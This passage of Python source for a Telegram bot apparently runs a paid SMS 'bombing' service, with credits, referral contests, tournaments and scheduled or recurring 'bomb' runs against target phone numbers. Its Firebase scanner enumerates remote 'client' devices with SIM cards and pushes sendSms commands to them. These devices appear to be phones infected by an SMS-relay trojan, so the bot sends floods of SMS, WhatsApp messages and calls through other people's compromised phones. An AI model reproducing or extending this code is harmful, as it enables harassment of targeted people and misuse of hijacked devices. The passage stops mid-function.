    for t in d["users"][k].get("templates", []):
        if t.get("name") == template_name:
            t["uses"] = t.get("uses", 0) + 1
            return


# ================= ACHIEVEMENTS =================
def get_user_achievements(uid: int, d: dict) -> dict:
    return d.get("user_achievements", {}).get(str(uid), {})


def unlock_achievement(uid: int, badge_key: str, d: dict) -> bool:
    if badge_key not in ACHIEVEMENTS: return False
    ach = d.setdefault("user_achievements", {}).setdefault(str(uid), {})
    if badge_key in ach: return False
    ach[badge_key] = int(time.time())
    return True


def check_and_unlock_achievements(bot: Bot, uid: int, d: dict) -> list:
    u = d.get("users", {}).get(str(uid), {})
    new_unlocks = []
    uses = u.get("uses", 0)
    refer_count = u.get("refer_count", 0)
    credits_bought = u.get("credits_bought", 0)
    joined_at = u.get("joined_at", 0)
    now = int(time.time())
    if uses >= 1 and unlock_achievement(uid, "first_blood", d): new_unlocks.append("first_blood")
    if uses >= 100 and unlock_achievement(uid, "sms_100", d): new_unlocks.append("sms_100")
    if uses >= 500 and unlock_achievement(uid, "sms_500", d): new_unlocks.append("sms_500")
    if uses >= 1000 and unlock_achievement(uid, "sms_1000", d): new_unlocks.append("sms_1000")
    if refer_count >= 10 and unlock_achievement(uid, "referral_king", d): new_unlocks.append("referral_king")
    if credits_bought >= 500 and unlock_achievement(uid, "big_spender", d): new_unlocks.append("big_spender")
    if joined_at > 0 and (now - joined_at) >= (30 * 86400) and unlock_achievement(uid, "loyal_user", d):
        new_unlocks.append("loyal_user")
    if len(d.get("users", {})) <= 100 and unlock_achievement(uid, "early_bird", d): new_unlocks.append("early_bird")
    spin_count = d.get("user_stats", {}).get(str(uid), {}).get("spin_count", 0)
    if spin_count >= 30 and unlock_achievement(uid, "spin_master", d): new_unlocks.append("spin_master")
    bomb_count = d.get("user_stats", {}).get(str(uid), {}).get("bomb_count", 0)
    if bomb_count >= 50 and unlock_achievement(uid, "bomb_expert", d): new_unlocks.append("bomb_expert")
    return new_unlocks


# ================= MISSIONS =================
def get_or_init_daily_missions(uid: int, d: dict) -> dict:
    today = ist_today_str()
    um = d.setdefault("user_missions", {}).setdefault(str(uid), {})
    if "daily" not in um or um["daily"].get("date") != today:
        um["daily"] = {"date": today, "progress": {k: 0 for k in DAILY_MISSIONS.keys()}, "claimed": []}
    return um["daily"]


def get_or_init_weekly_missions(uid: int, d: dict) -> dict:
    week = ist_week_str()
    um = d.setdefault("user_missions", {}).setdefault(str(uid), {})
    if "weekly" not in um or um["weekly"].get("week") != week:
        um["weekly"] = {"week": week, "progress": {k: 0 for k in WEEKLY_MISSIONS.keys()}, "claimed": []}
    return um["weekly"]


def add_mission_progress(uid: int, mission_key: str, amount: int, d: dict):
    daily = get_or_init_daily_missions(uid, d)
    if mission_key in daily["progress"]:
        daily["progress"][mission_key] = daily["progress"].get(mission_key, 0) + amount
    weekly = get_or_init_weekly_missions(uid, d)
    if mission_key in weekly["progress"]:
        weekly["progress"][mission_key] = weekly["progress"].get(mission_key, 0) + amount


# ================= TOURNAMENT =================
def get_current_tournament(d: dict) -> dict:
    week = ist_week_str()
    return d.setdefault("tournaments", {}).setdefault("current", {
        "week": week, "scores": {}, "started_at": int(time.time())
    })


def add_tournament_score(uid: int, amount: int, d: dict):
    week = ist_week_str()
    t = d.setdefault("tournaments", {})
    if t.get("current", {}).get("week") != week:
        t["current"] = {"week": week, "scores": {}, "started_at": int(time.time())}
    scores = t["current"].setdefault("scores", {})
    scores[str(uid)] = scores.get(str(uid), 0) + amount


def get_tournament_standings(d: dict, top: int = 3) -> list:
    t = d.get("tournaments", {}).get("current", {})
    scores = t.get("scores", {})
    arr = []
    for uid_str, score in scores.items():
        try:
            arr.append((int(uid_str), get_display_name(int(uid_str), d), score))
        except: pass
    arr.sort(key=lambda x: x[2], reverse=True)
    return arr[:top]


def should_distribute_tournament(d: dict) -> bool:
    t = d.get("tournaments", {})
    if not t.get("enabled", False): return False
    current = t.get("current", {})
    last_week = current.get("week", "")
    this_week = ist_week_str()
    return last_week != "" and last_week != this_week


# ================= SPIN WHEEL =================
def spin_wheel() -> int:
    r = random.randint(1, 100)
    cum = 0
    for credits, prob in SPIN_PRIZES:
        cum += prob
        if r <= cum: return credits
    return 1


# ================= LUCKY DRAW =================
def should_do_lucky_draw(d: dict) -> bool:
    ld = d.get("lucky_draw", {})
    if not ld.get("enabled", False): return False
    current_week = ist_week_str()
    last = ld.get("last_drawn", "")
    return last != current_week


async def do_lucky_draw(bot: Bot):
    d = load()
    ld = d.get("lucky_draw", {})
    if not ld.get("enabled", False): return
    users = list(d.get("users", {}).keys())
    if not users: return
    winner_uid = random.choice(users)
    credits = ld.get("credits", 50)
    add_credits(int(winner_uid), credits, d)
    d["lucky_draw"]["last_drawn"] = ist_week_str()
    save(d)
    try:
        await bot.send_message(int(winner_uid),
            f"🎲 <b>LUCKY DRAW WINNER!</b>\n\n"
            f"🎉 Congratulations! Aap is hafte ke lucky draw winner hain!\n\n"
            f"💰 Prize: <b>+{credits} credits</b>",
            parse_mode="HTML")
    except: pass


# ================= CONTEST =================
def should_distribute_contest(d: dict) -> bool:
    contest = d.get("referral_contest", {})
    if not contest.get("enabled", False): return False
    current_month = ist_month_str()
    last = contest.get("last_distributed", "")
    return last != current_month


# ================= QUEUE =================
def add_to_queue(uid: int, phone: str, cycles: int, credits_per_cycle: int = CREDITS_PER_CYCLE):
    BOMB_QUEUE[uid].append({"phone": phone, "cycles": cycles,
                            "credits_per_cycle": credits_per_cycle, "added_at": time.time()})


def get_queue(uid: int) -> list:
    return BOMB_QUEUE.get(uid, [])


def clear_queue(uid: int):
    BOMB_QUEUE.pop(uid, None)


def move_queue_item(uid: int, idx: int, direction: int) -> bool:
    q = BOMB_QUEUE.get(uid, [])
    if not q: return False
    new_idx = idx + direction
    if 0 <= new_idx < len(q):
        q[idx], q[new_idx] = q[new_idx], q[idx]
        return True
    return False


# ================= DISCOUNT =================
def calculate_discounted_price(price: float, discount_percent: float) -> float:
    if discount_percent <= 0: return price
    return round(price * (1 - discount_percent / 100), 2)


def format_price_display(price: float, discount_percent: float) -> str:
    if discount_percent <= 0: return f"₹{price}"
    discounted = calculate_discounted_price(price, discount_percent)
    return f"<s>₹{price}</s> <b>₹{discounted}</b> ({int(discount_percent)}% OFF)"


# ================= MAINTENANCE =================
def is_maintenance(d: dict = None) -> bool:
    if d is None: d = load()
    m = d.get("maintenance", {})
    if not m.get("enabled", False): return False
    auto_resume = m.get("auto_resume_at", 0)
    if auto_resume > 0 and int(time.time()) >= auto_resume:
        m["enabled"] = False
        m["auto_resume_at"] = 0
        d["maintenance"] = m
        save(d)
        return False
    return True


def maintenance_text(d: dict = None) -> str:
    if d is None: d = load()
    m = d.get("maintenance", {})
    msg = m.get("message", "Bot is under maintenance.")
    eta = m.get("eta", "")
    text = f"🛠 <b>MAINTENANCE MODE</b>\n━━━━━━━━━━━━━━━━━━\n\n{msg}\n\n"
    if eta:
        text += f"⏰ <b>Expected resume:</b> {eta}\n\n"
    text += f"👤 <b>Owner:</b> {SUPER_ADMIN_NAME}"
    return text


# ================= SCAN STATUS =================
def get_scan_status() -> str:
    global SCAN_STATUS, CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS
    if SCANNING_IN_PROGRESS: return f"{em(EMOJI_WARNING, '⏳')} sᴄᴀɴɴɪɴɢ..."
    if not CACHED_DEVICES: return f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
    dc = len(CACHED_DEVICES)
    td = time.time() - LAST_SCAN_TIME
    if td < 60: return f"{em(EMOJI_CHECK, '🟢')} {dc} ᴅᴇᴠɪᴄᴇs"
    elif td < 300: return f"{em(EMOJI_WARNING, '🟡')} {dc} ᴅᴇᴠɪᴄᴇs ({int(td/60)}ᴍ)"
    else: return f"{em(EMOJI_CROSS, '🔴')} {dc} ᴅᴇᴠɪᴄᴇs ({int(td/60)}ᴍ)"


# ================= FIREBASE HELPERS =================
async def send_fire_effect_private(bot: Bot, chat_id: int):
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
            payload = {"chat_id": chat_id, "text": "🔥", "message_effect_id": FIRE_EFFECT_ID}
            async with session.post(url, json=payload, timeout=5) as resp:
                res = await resp.json()
                if res.get("ok"):
                    msg_id = res["result"]["message_id"]
                    await asyncio.sleep(2)
                    del_url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteMessage"
                    await session.post(del_url, json={"chat_id": chat_id, "message_id": msg_id})
    except Exception as e:
        log.warning(f"Fire: {e}")


async def send_channel_log(bot: Bot, text: str):
    try:
        await bot.send_message(LOG_CHANNEL_ID, text, parse_mode="HTML")
    except Exception as e:
        log.error(f"Chan log: {e}")


async def fb_get(base_url: str, path: str) -> dict:
    url = base_url.rstrip("/") + path
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status == 200:
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt: return {}
                    return json.loads(txt)
    except Exception as e:
        log.warning(f"fb_get: {e}")
    return {}


async def fb_put(base_url: str, path: str, payload: dict) -> bool:
    url = base_url.rstrip("/") + path
    for attempt in range(3):
        try:
            async with aiohttp.ClientSession() as s:
                async with s.put(url, json=payload, timeout=aiohttp.ClientTimeout(total=6)) as r:
                    if 200 <= r.status < 300: return True
        except Exception as e:
            log.warning(f"fb_put {attempt+1}: {e}")
        await asyncio.sleep(0.5 * (attempt + 1))
    return False


def device_is_online(device_data: dict) -> bool:
    return any([device_data.get("isOnline"), device_data.get("online"),
                device_data.get("connected"),
                device_data.get("status") in ("online", "active", True, 1)])


async def get_all_online_devices(d: dict) -> list:
    fbs = d.get("firebases", [])
    if not fbs: return []
    results = []
    current_fb_ids = {fb["id"] for fb in fbs}
    global CACHED_DEVICES
    CACHED_DEVICES = [dev for dev in CACHED_DEVICES if dev.get("fb_id") in current_fb_ids]
    _dev_sem = asyncio.Semaphore(15)

    async def fetch_one(fb: dict):
        shallow_url = fb["url"].rstrip("/") + "/clients.json?shallow=true"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(shallow_url, timeout=aiohttp.ClientTimeout(total=10)) as r:
                    if r.status != 200: return
                    txt = (await r.text()).strip()
                    if txt == "null" or not txt: return
                    device_ids = json.loads(txt)
                    if not isinstance(device_ids, dict): return

                    async def fetch_dev(dev_id: str):
                        try:
                            url = fb["url"].rstrip("/") + f"/clients/{dev_id}.json"
                            async with _dev_sem:
                                async with s.get(url, timeout=aiohttp.ClientTimeout(total=8)) as r2:
                                    if r2.status == 200:
                                        txt2 = (await r2.text()).strip()
                                        if txt2 == "null" or not txt2: return None
                                        dev_data = json.loads(txt2)
                                        if isinstance(dev_data, dict) and device_is_online(dev_data):
                                            name = dev_data.get("deviceName") or dev_data.get("name") or dev_id[:16]
                                            sims = dev_data.get("sims", [])
                                            return {"fb_id": fb["id"], "fb_url": fb["url"],
                                                    "fb_label": fb.get("label", fb["url"][:30]),
                                                    "dev_id": dev_id, "dev_name": name, "sims": sims}
                        except Exception as e:
                            log.warning(f"Dev fetch: {e}")
                        return None

                    dev_ids = list(device_ids.keys())
                    for i in range(0, len(dev_ids), 20):
                        batch = dev_ids[i:i+20]
                        dev_tasks = [fetch_dev(dev_id) for dev_id in batch]
                        dev_results = await asyncio.gather(*dev_tasks)
                        for res in dev_results:
                            if res: results.append(res)
        except Exception as e:
            log.warning(f"shallow: {e}")

    await asyncio.gather(*(fetch_one(fb) for fb in fbs))
    return results


async def send_sms_via_device(fb_url: str, dev_id: str, sim_slot: int, to: str, message: str) -> bool:
    return await fb_put(fb_url, f"/clients/{dev_id}/webhookEvent/sendSms.json",
                        {"from": sim_slot, "to": to.strip(), "message": message.strip(),
                         "isSended": False, "timestamp": int(time.time())})


async def send_random_video(bot: Bot, chat_id: int, caption: str = ""):
    d = load()
    videos = d.get("videos", [])
    if videos:
        video_item = random.choice(videos)
        try:
            await bot.send_video(chat_id, video=video_item, caption=caption, parse_mode="HTML")
        except Exception as e:
            log.error(f"Video: {e}")


# ================= FORCE JOIN =================
async def check_membership(bot: Bot, uid: int, channel_id: str) -> bool:
    try:
        chat_id = int(str(channel_id).strip())
        member = await bot.get_chat_member(chat_id, uid)
        return member.status in ("member", "administrator", "creator")
    except Exception as e:
        log.error(f"FJ: {e}")
        return False


async def user_joined_all(bot: Bot, uid: int, d: dict) -> tuple:
    if is_owner(uid, d): return True, []
    fj = d.get("force_join", {})
    if not fj.get("enabled", False): return True, []
    channels = fj.get("channels", [])
    missing = []
    for ch in channels:
        if ch.get("required", True):
            if not await check_membership(bot, uid, ch["id"]):
                missing.append(ch)
    return len(missing) == 0, missing


def force_join_text(missing: list) -> str:
    lines = [f"⛔ <b>{sc('bot use karne ke liye pehle join karein!')}</b>\n\n",
             f"👇 ɴɪᴄʜᴇ ᴅɪʏᴇ ɢᴀʏᴇ ᴄʜᴀɴɴᴇʟs/ɢʀᴏᴜᴘs ᴊᴏɪɴ ᴋᴀʀᴇɪɴ:"]
    for ch in missing:
        lines.append(f"\n• <a href='{ch['link']}'>{ch.get('title', 'Channel')}</a>")
    lines.append(f"\n\n<i>{sc('join karne ke baad /start karein.')}</i>")
    return "\n".join(lines)


def force_join_kb(missing: list) -> InlineKeyboardMarkup:
    rows = []
    for ch in missing:
        rows.append([btn_url(f"ᴊᴏɪɴ {ch.get('title', 'Channel')}", ch["link"], EMOJI_BELL, "🔔")])
    rows.append([btn("ʀᴇғʀᴇsʜ", "fj:check", EMOJI_GEAR, "🔄")])
    return InlineKeyboardMarkup(inline_keyboard=rows)


# ================= BACKGROUND SCANNER =================
async def background_firebase_scanner(bot: Bot):
    global CACHED_DEVICES, LAST_SCAN_TIME, SCANNING_IN_PROGRESS, SCAN_STATUS
    log.info("Scanner STARTED")
    while True:
        async with SCAN_LOCK:
            if SCANNING_IN_PROGRESS:
                await asyncio.sleep(5); continue
            SCANNING_IN_PROGRESS = True
        SCAN_STATUS = f"{em(EMOJI_WARNING, '🔍')} sᴄᴀɴɴɪɴɢ..."
        start_scan = time.time()
        try:
            d = load()
            fbs = d.get("firebases", [])
            if not fbs:
                SCAN_STATUS = f"{em(EMOJI_WARNING, '⚠️')} ɴᴏ ғɪʀᴇʙᴀsᴇ"
                CACHED_DEVICES = []
                async with SCAN_LOCK: SCANNING_IN_PROGRESS = False
                await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)
                continue
            devices = await get_all_online_devices(d)
            scan_duration = time.time() - start_scan
            CACHED_DEVICES = devices
            now = int(time.time())
            fb_health = d.setdefault("firebase_health", {})
            for fb in fbs:
                fb_id = fb["id"]; fb_label = fb.get("label", fb["url"][:30])
                fb_online = sum(1 for dv in devices if dv["fb_id"] == fb_id)
                FB_DEVICE_COUNTS[fb_id] = {"label": fb_label, "online": fb_online, "last_update": now}
                if fb_id not in fb_health:
                    fb_health[fb_id] = {"last_seen_online": 0, "last_check": 0, "label": fb_label}
                fb_health[fb_id]["last_check"] = now
                fb_health[fb_id]["label"] = fb_label
                if fb_online > 0:
                    fb_health[fb_id]["last_seen_online"] = now
            LAST_SCAN_TIME = now
            save(d)
            if devices:
                SCAN_STATUS = f"{em(EMOJI_CHECK, '🟢')} {len(devices)} ᴅᴇᴠɪᴄᴇs ᴏɴʟɪɴᴇ"
                log.info(f"[SCAN] {len(devices)} devices | {len(fbs)} DBs | {scan_duration:.1f}s")
            else:
                SCAN_STATUS = f"{em(EMOJI_CROSS, '🔴')} ɴᴏ ᴅᴇᴠɪᴄᴇs"
        except Exception as e:
            SCAN_STATUS = f"{em(EMOJI_CROSS, '❌')} ᴇʀʀᴏʀ: {str(e)[:30]}"
            log.error(f"[SCAN] {e}")
        finally:
            async with SCAN_LOCK: SCANNING_IN_PROGRESS = False
        await asyncio.sleep(_BACKGROUND_SCAN_INTERVAL)


def get_cached_devices() -> list:
    return CACHED_DEVICES


# ================= VALIDITY EXPIRY WORKER =================
async def validity_expiry_worker(bot: Bot):
    log.info("Validity Expiry Worker STARTED")
    await asyncio.sleep(30)
    while True:
        try:
            d = load()
            now = int(time.time())
            one_day = 86400
            notified = d.setdefault("validity_notified", {})
            changed = False
            for uid_str, u in list(d.get("users", {}).items()):
                until = u.get("validity_until", 0)
                plan = u.get("validity_plan")
                if not until or not plan: continue
                prefs = u.get("notif_prefs", {})
                if not prefs.get("validity_expiring", True): continue
                if until <= now:
                    last = notified.get(uid_str, 0)
                    if last != -1:
                        try:
                            await bot.send_message(int(uid_str),
                                f"⏰ <b>Validity Expired!</b>\n\n📋 Plan: <b>{plan}</b>\n"
                                f"📅 Expired at: <code>{fmt_time(until)}</code>\n\n"
                                f"🔄 Renew karne ke liye {SUPER_ADMIN_NAME} se contact karein.",
                                parse_mode="HTML")
                            notified[uid_str] = -1; changed = True
                        except: pass
                    continue
                time_left = until - now
                if 0 < time_left <= one_day:
                    last = notified.get(uid_str, 0)
                    if last < (now - one_day):
                        try:
                            hrs = time_left // 3600
                            mins = (time_left % 3600) // 60
                            await bot.send_message(int(uid_str),
                                f"⚠️ <b>Validity Expiry Reminder!</b>\n\n"
                                f"📋 Plan: <b>{plan}</b>\n"
                                f"⏰ Expires in: <b>{hrs}h {mins}m</b>\n"
                                f"📅 Expires at: <code>{fmt_time(until)}</code>",
                                parse_mode="HTML")
                            notified[uid_str] = now; changed = True
                        except: pass
            if changed:
                d["validity_notified"] = notified; save(d)
        except Exception as e:
            log.error(f"Validity worker: {e}")
        await asyncio.sleep(_VALIDITY_CHECK_INTERVAL)


# ================= RENEWAL REMINDER WORKER =================
async def renewal_reminder_worker(bot: Bot):
    log.info("Renewal Reminder Worker STARTED")
    await asyncio.sleep(60)
    while True:
        try:
            d = load()
            now = int(time.time())
            changed = False
            for uid_str, u in list(d.get("users", {}).items()):
                until = u.get("validity_until", 0)
                plan = u.get("validity_plan")
                if not until or not plan: continue
                if until <= now: continue
                prefs = u.get("notif_prefs", {})
                if not prefs.get("validity_expiring", True): continue
                time_left = until - now
                hours_left = time_left // 3600
                reminders = d.setdefault("renewal_reminders", {}).setdefault(uid_str, {})
                if 48 < hours_left <= 72 and not reminders.get("3day_sent"):
                    try:
                        days = hours_left // 24
                        await bot.send_message(int(uid_str),
                            f"⚠️ <b>Validity Reminder</b>\n\n📋 Plan: <b>{plan}</b>\n"
                            f"⏰ Aapki validity <b>{days} din</b> me expire hogi\n"
                            f"📅 Expires: <code>{fmt_time(until)}</code>\n\n💎 Abhi renew karo!",
                            reply_markup=renewal_reminder_kb(),
                            parse_mode="HTML")
                        reminders["3day_sent"] = True
                        changed = True
                    except: pass
                elif 0 < hours_left <= 24 and not reminders.get("1day_sent"):
                    try:
                        mins = (time_left % 3600) // 60
                        await bot.send_message(int(uid_str),
                            f"🚨 <b>URGENT: Validity Expiring!</b>\n\n📋 Plan: <b>{plan}</b>\n"
                            f"⏰ Sirf <b>{hours_left}h {mins}m</b> bache\n"
                            f"📅 Expires: <code>{fmt_time(until)}</code>\n\n💎 Turant renew karo!",
                            reply_markup=renewal_reminder_kb(),
                            parse_mode="HTML")
                        reminders["1day_sent"] = True
                        changed = True
                    except: pass
            if changed:
                save(d)
        except Exception as e:
            log.error(f"Renewal worker: {e}")
        await asyncio.sleep(_RENEWAL_REMINDER_INTERVAL)


# ================= SCHEDULED BOMB WORKER =================
async def scheduled_bomb_worker(bot: Bot):
    log.info("Sched Worker STARTED")
    while True:
        try:
            now = time.time()
            to_run = []
            for sid, sb in list(scheduled_bombs.items()):
                if sb.get("run_at", 0) <= now and not sb.get("running"):
                    sb["running"] = True
                    to_run.append((sid, sb))
            for sid, sb in to_run:
                uid = sb["user_id"]
                bomb_type = sb.get("bomb_type", "classic")
                if bomb_type == "custom_sms":
                    phone = sb["phone"]
                    message_text = sb.get("message", "")
                    speed = sb.get("speed", SPEED_DEFAULT)
                    count = sb.get("count", 1)
                    try:
                        await bot.send_message(uid,
                            f"⏰ *SCHEDULED CUSTOM SMS TRIGGERED!*\n📱 `{phone}`\n💬 `{message_text[:50]}`\n"
                            f"🔢 `{count}` SMS\n🕐 IST: `{ist_time_str()}`",
                            parse_mode="Markdown")
                    except: pass
                    devices = get_cached_devices() or await get_all_online_devices(load())
                    if devices:
                        asyncio.create_task(run_scheduled_custom_sms(bot, uid, phone, message_text, count, devices, speed))
                else:
                    phone = sb["phone"]; cycles = sb["cycles"]
                    try:
                        await bot.send_message(uid,
                            f"⏰ *SCHEDULED CLASSIC BOMB TRIGGERED!*\n📱 `{phone}`\n"
                            f"🔁 `{cycles}` cycles\n🕐 IST: `{ist_time_str()}`",
                            parse_mode="Markdown")
                    except: pass
                    active_classic_bombings[uid] = True
                    classic_bombing_stats[uid] = {'sms': 0, 'wa': 0, 'calls': 0}
                    asyncio.create_task(run_classic_bombing(bot, uid, uid, phone, cycles, 0))
                del scheduled_bombs[sid]
            if to_run:
                d = load(); d["scheduled_bombs"] = scheduled_bombs; save(d)
        except Exception as e:
            log.error(f"Sched: {e}")
        await asyncio.sleep(20)


# ================= RECURRING WORKER =================
async def recurring_schedule_worker(bot: Bot):
    log.info("Recurring Worker STARTED")
    while True:
        try:
            now_ist = ist_now()
            current_hhmm = now_ist.strftime("%H:%M")
            today_str = now_ist.strftime("%Y-%m-%d")
            for sid, rs in list(recurring_schedules.items()):
                uid = rs["user_id"]
                time_of_day = rs.get("time_of_day", "")
                last_run_date = rs.get("last_run_date", "")
                if time_of_day == current_hhmm and last_run_date != today_str:
                    bomb_type = rs.get("bomb_type", "classic")
                    if bomb_type == "custom_sms":
                        phone = rs["phone"]
                        message_text = rs.get("message", "")
                        speed = rs.get("speed", SPEED_DEFAULT)
                        count = rs.get("count", 1)
                        try:
                            await bot.send_message(uid,
                                f"🔁 *RECURRING CUSTOM SMS!*\n📱 `{phone}`\n🔢 `{count}` SMS\n🕐 IST: `{ist_time_str()}`",
                                parse_mode="Markdown")
                        except: pass
                        devices = get_cached_devices() or await get_all_online_devices(load())
                        if devices:
                            asyncio.create_task(run_scheduled_custom_sms(bot, uid, phone, message_text, count, devices, speed))
                    else:
                        phone = rs["phone"]; cycles = rs["cycles"]
                        try:
                            await bot.send_message(uid,
                                f"🔁 *RECURRING CLASSIC BOMB!*\n📱 `{phone}`\n🔁 `{cycles}` cycles\n🕐 IST: `{ist_time_str()}`",
                                parse_mode="Markdown")
                        except: pass
                        active_classic_bombings[uid] = True
                        classic_bombing_stats[uid] = {'sms': 0, 'wa': 0, 'calls': 0}
                        asyncio.create_task(run_classic_bombing(bot, uid, uid, phone, cycles, 0))
                    rs["last_run_date"] = today_str
            d = load()
            d["recurring"] = recurring_schedules
            save(d)
        except Exception as e:
            log.error(f"Recurring worker: {e}")
        await asyncio.sleep(30)


# ================= CONTEST WORKER =================
async def referral_contest_worker(bot: Bot):
    log.info("Contest Worker STARTED")
    await asyncio.sleep(120)
    while True:
        try:
            d = load()
            if should_distribute_contest(d):
                await distribute_referral_contest(bot)
        except Exception as e:
            log.error(f"Contest: {e}")
        await asyncio.sleep(_CONTEST_CHECK_INTERVAL)


async def distribute_referral_contest(bot: Bot):
    d = load()
    contest = d.get("referral_contest", {})
    if not contest.get("enabled", False): return
    prizes = contest.get("prizes", [100, 50, 25])
    lb = get_referral_leaderboard(d, 3)
    if not lb: return
    winners = []
    for i, (uid, name, refs) in enumerate(lb):
        if i >= len(prizes): break
        if refs == 0: continue
        prize = prizes[i]
        add_credits(uid, prize, d)
        winners.append((uid, name, refs, prize))
    if winners:
        d.setdefault("referral_contest", {}).setdefault("history", []).append({
            "month": contest.get("last_distributed", ""),
            "winners": [{"uid": w[0], "name": w[1], "refs": w[2], "prize": w[3]} for w in winners],
            "distributed_at": int(time.time())
        })
        d["referral_contest"]["last_distributed"] = ist_month_str()
        save(d)
        medals = ["🥇", "🥈", "🥉"]
        for i, (uid, name, refs, prize) in enumerate(winners):
            try:
                await bot.send_message(uid,
                    f"🏆 <b>REFERRAL CONTEST WINNER!</b>\n\n"
                    f"{medals[i]} <b>Rank #{i+1}</b>\n👥 Referrals: <b>{refs}</b>\n"
                    f"💰 Prize: <b>+{prize} credits</b>\n\n🎉 Congratulations!",
                    parse_mode="HTML")
            except: pass


# ================= LUCKY DRAW WORKER =================
async def lucky_draw_worker(bot: Bot):
    log.info("Lucky Draw Worker STARTED")
    await asyncio.sleep(180)
    while True:
        try:
            d = load()
            if should_do_lucky_draw(d):
                await do_lucky_draw(bot)
        except Exception as e:
            log.error(f"Lucky: {e}")
        await asyncio.sleep(3600)


# ================= TOURNAMENT WORKER =================
async def tournament_worker(bot: Bot):
    log.info("Tournament Worker STARTED")
    await asyncio.sleep(200)
    while True:
        try:
            d = load()
            if should_distribute_tournament(d):
                await distribute_tournament(bot)
        except Exception as e:
            log.error(f"Tournament: {e}")
        await asyncio.sleep(_TOURNAMENT_CHECK_INTERVAL)


async def distribute_tournament(bot: Bot):
    d = load()
    t = d.get("tournaments", {})
    if not t.get("enabled", False): return
    current = t.get("current", {})
    prizes = t.get("prizes", [500, 250, 100])
    last_week = current.get("week", "")
    scores = current.get("scores", {})
    if not scores:
        t["current"] = {"week": ist_week_str(), "scores": {}, "started_at": int(time.time())}
        save(d)
        return
    arr = []
    for uid_str, score in scores.items():
        try:
            arr.append((int(uid_str), score))
        except: pass
    arr.sort(key=lambda x: x[1], reverse=True)
    top3 = arr[:3]
    winners = []
    for i, (uid, score) in enumerate(top3):
        if score == 0: continue
        prize = prizes[i] if i < len(prizes) else 0
        if prize > 0:
            add_credits(uid, prize, d)
            winners.append((uid, score, prize))
    if winners:
        t.setdefault("history", []).append({
            "week": last_week,
            "winners": [{"uid": w[0], "score": w[1], "prize": w[2]} for w in winners],
            "distributed_at": int(time.time())
        })
        medals = ["🥇", "🥈", "🥉"]
        for i, (uid, score, prize) in enumerate(winners):
            try:
                await bot.send_message(uid,
                    f"🏆 <b>WEEKLY TOURNAMENT WINNER!</b>\n\n"
                    f"{medals[i]} <b>Rank #{i+1}</b>\n📤 SMS Sent: <b>{score}</b>\n"
                    f"💰 Prize: <b>+{prize} credits</b>\n\n🎉 Congratulations!",
                    parse_mode="HTML")
            except: pass
    t["current"] = {"week": ist_week_str(), "scores": {}, "started_at": int(time.time())}
    save(d)


# ================= AUTO BACKUP WORKER =================
async def auto_backup_worker(bot: Bot):
    log.info("Auto Backup Worker STARTED")
    await asyncio.sleep(300)
    while True:
        try:
            if os.path.exists(_DATA_FILE):
                d = load()
                file_size = os.path.getsize(_DATA_FILE)
                size_str = f"{file_size / 1024:.1f} KB" if file_size < 1024*1024 else f"{file_size / (1024*1024):.1f} MB"
                users_count = len(d.get("users", {}))
                total_sent = d.get("stats", {}).get("total_sent", 0)
                credits_total = sum(u.get("credits", 0) for u in d.get("users", {}).values())
                now = ist_now()
                backup_name = f"blast5_backup_{now.strftime('%Y-%m-%d_%H-%M')}.json"
                caption = (
                    f"💾 <b>AUTO BACKUP</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"📅 Date: <code>{now.strftime('%d/%m/%Y')}</code>\n"
                    f"⏰ Time: <code>{now.strftime('%H:%M')} IST</code>\n"
                    f"📊 Size: <b>{size_str}</b>\n"
                    f"👥 Users: <b>{users_count}</b>\n"
                    f"📤 Total SMS: <b>{total_sent}</b>\n"
                    f"💰 Credits in Circulation: <b>{credits_total}</b>\n\n"
                    f"<i>Auto-generated backup</i>"
                )
                try:
                    file_input = FSInputFile(_DATA_FILE, filename=backup_name)
                    await bot.send_document(MAIN_OWNER, file_input, caption=caption, parse_mode="HTML")
                    log.info(f"[BACKUP] Sent to owner | {size_str} | {users_count} users")
                except Exception as e:
                    log.error(f"[BACKUP] Send failed: {e}")
        except Exception as e:
            log.error(f"[BACKUP] Error: {e}")
        await asyncio.sleep(_BACKUP_INTERVAL)
# =====================================================================
# PART 3 — SMS Blast Runner, Classic Bomb Runner, Multi-Bomb Runner,
#          Scheduled/Recurring Custom SMS, Number Info Callbacks
# =====================================================================
# ⚠️ Isko PART 2 ke turant baad paste karo
# =====================================================================


# ================= NUMBER INFO CALLBACKS =================
@R.callback_query(F.data.startswith("numinfo:agree:"))
async def numinfo_agree(cq: CallbackQuery, state: FSMContext):
    phone_from_cb = cq.data.split(":", 2)[2]
    fsmd = await state.get_data()
    number = fsmd.get("number", phone_from_cb)

    try:
        await cq.message.delete()
    except:
        pass

    await state.set_state(S.send_message)
    await cq.message.answer(
        f"✅ <b>Confirmed!</b>\n\n"
        f"📞 <code>{mask_number(number)}</code>\n\n"
        f"💬 <b>{sc('step 2/4')} — {sc('message')}</b>\n\n"
        f"Message type karo:",
        reply_markup=kb([(f"{sc('cancel')}", "user:cancel")]),
        parse_mode="HTML"
    )
    await cq.answer("✅ Confirmed!")


@R.callback_query(F.data.startswith("numinfo:cancel:"))
async def numinfo_cancel(cq: CallbackQuery, state: FSMContext):
    await state.clear()
    try:
        await cq.message.delete()
    except:
        pass
    await cq.message.answer(
        f"❌ <b>Cancelled!</b>\n\nNumber daal ke dobara try karo.",
        parse_mode="HTML"
    )
    await cq.answer("❌ Cancelled")


@R.callback_query(F.data.startswith("classicnuminfo:agree:"))
async def classicnuminfo_agree(cq: CallbackQuery, state: FSMContext):
    phone_from_cb = cq.data.split(":", 2)[2]
    fsmd = await state.get_data()
    phone = fsmd.get("classic_phone", phone_from_cb)
    user_id = cq.from_user.id

    try:
        await cq.message.delete()
    except:
        pass

    d = load()
    deduct = should_deduct_credits(user_id, d)
    await state.set_state(S.classic_bomb_credits)

    if not deduct:
        if has_active_validity(user_id, d):
            v = get_validity_info(user_id, d)
            await cq.message.answer(
                f"✅ `{phone}`\n\n🎫 *Valid: `{v['plan_name']}`*\n"
